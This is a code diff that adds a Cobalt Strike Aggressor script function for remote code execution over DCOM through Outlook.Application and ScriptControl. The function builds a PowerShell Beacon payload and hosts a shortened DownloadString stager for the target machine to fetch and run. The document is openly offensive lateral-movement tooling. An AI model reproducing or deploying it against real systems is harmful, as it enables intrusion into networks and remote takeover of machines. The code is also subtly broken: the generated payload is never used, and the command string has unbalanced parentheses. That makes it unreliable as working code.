@@ -47,3 +47,22 @@ sub dcom_shellexecute {
     bpowershell($1, $short);
 }
 
+# DCOM Outlook remote code execution.
+sub dcom_outlook {
+    local('$payload $cmd');
+
+    # Acknowledge task
+    btask($1, "Tasked Beacon to run (" . listener_describe($3, $2) . ") via DCOM Outlook");
+
+    # Generate PowerShell one-liner for payload
+    $payload = powershell($3, true, "x86");
+    $payload = strrep($payload, "powershell.exe ", "");
+
+    $cmd = "[System.Activator]::CreateInstance([Type]::GetTypeFromProgID('Outlook.Application').CreateObject(\"ScriptControl\")";
+
+    # Use beacon_host_script to generate a shorter DownloadString
+    # payload that we can use w/ make_token
+    $short = beacon_host_script($1, $cmd);
+
+    bpowershell($1, $short);
+}
